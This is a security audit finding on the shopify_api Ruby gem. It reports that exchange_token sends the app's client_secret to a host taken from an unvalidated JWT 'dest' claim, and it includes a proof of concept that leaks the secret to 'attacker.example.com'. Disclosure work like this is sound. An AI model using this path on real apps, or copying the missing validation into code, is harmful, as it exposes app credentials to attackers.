## Title
`TokenExchange.exchange_token` sends the app's `client_secret` to a host built from an unvalidated JWT `dest` claim - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the token-exchange request host directly from the `dest` claim of the caller-supplied session (`id`) token, without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every sibling method (`migrate_to_expiring_token`, `RefreshToken.refresh_access_token`, `ClientCredentials.client_credentials`) that performs the same class of request.

### Finding Description
`exchange_token` builds the shop that receives the app's `client_id`/`client_secret` from the token's `dest` claim with no domain allow-list check: [1](#0-0) 

`dest_shop = jwt_payload.shop` is only validated for *presence of a valid signature* by `JwtPayload`, which itself does not restrict `dest` to a `*.myshopify.com`/trusted Shopify domain — it merely strips the `https://` prefix: [2](#0-1) 

The resulting `shop_session` (`Auth::Session.new(shop: dest_shop)`) is handed to `Clients::HttpClient`, which builds the outbound request host directly from `session.shop`: [3](#0-2) 

The POST body containing `client_id` and `client_secret` (`ShopifyAPI::Context.api_secret_key`) is then sent to `https://#{dest_shop}/admin/oauth/access_token`: [4](#0-3) 

By contrast, every other flow that sends the same `client_secret` to a shop-derived host first calls `Utils::ShopValidator.sanitize!(shop)`, which raises `Errors::InvalidShopError` unless the host resolves to one of the `TRUSTED_SHOPIFY_DOMAINS`: [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) 

The identity binding that is broken is: **the host that receives `client_secret` should equal a value validated against `ShopValidator`'s trusted-domain set**, but in `exchange_token` the host equals the raw, JWT-signature-checked-only `dest` claim, which is not constrained to a Shopify-owned domain format.

### Impact Explanation
This is a High-severity SSRF-with-credentials pattern: a host application that calls `exchange_token` with an ID token whose `dest` claim is not itself validated to be `*.myshopify.com` (this is exactly the argument documented for the caller to supply — a "shopify_id_token"/session token from the request) causes the gem to transmit the app's `client_id`/`client_secret` to a shop-derived host without any allow-list check, unlike its sibling methods. Since the same secret is reused across all installs, exfiltration of it via a malicious host is equivalent to full compromise of every merchant's OAuth trust for the app.

### Likelihood Explanation
Exploitability depends on whether an unprivileged party can produce/obtain a session token whose `aud` matches `Context.api_key` but whose `dest` is not a genuine `*.myshopify.com` domain. Under normal Shopify session-token issuance, `dest` is constrained by Shopify itself, so this is primarily a defense-in-depth gap rather than a directly attacker-forgeable payload absent a token-issuance bug or misuse of the token-exchange API with attacker-influenced session tokens (e.g., an app that passes through a raw, unauthenticated `id_token`-shaped value from an untrusted embed/proxy context). Given this uncertainty, likelihood is best characterized as low-to-moderate, and I could not conclusively verify a fully unprivileged, credential-free trigger path within this repo alone.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` through `Utils::ShopValidator.sanitize!` (as done in `migrate_to_expiring_token`, `refresh_access_token`, and `client_credentials`) before constructing `shop_session`/`HttpClient`, so the outbound host receiving `client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)` with a signed session token (signed with the app's own `api_secret_key`, as required by `JwtPayload`) whose `dest` claim is set to an attacker-controlled host, e.g. `"https://attacker.example.com"`.
2. `JwtPayload.new` accepts it because it only checks `aud == Context.api_key` and signature validity, not the domain shape of `dest`.
3. `exchange_token` builds `Session.new(shop: "attacker.example.com")` and `Clients::HttpClient.new(session: shop_session, ...)`.
4. `HttpClient#initialize` sets `@base_uri = "https://attacker.example.com"`.
5. `client.request(...)` POSTs `{client_id, client_secret, grant_type, subject_token, ...}` to `https://attacker.example.com/admin/oauth/access_token`, leaking `client_secret` to the attacker-controlled host — a step prevented in the sibling flows by `ShopValidator.sanitize!`.

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
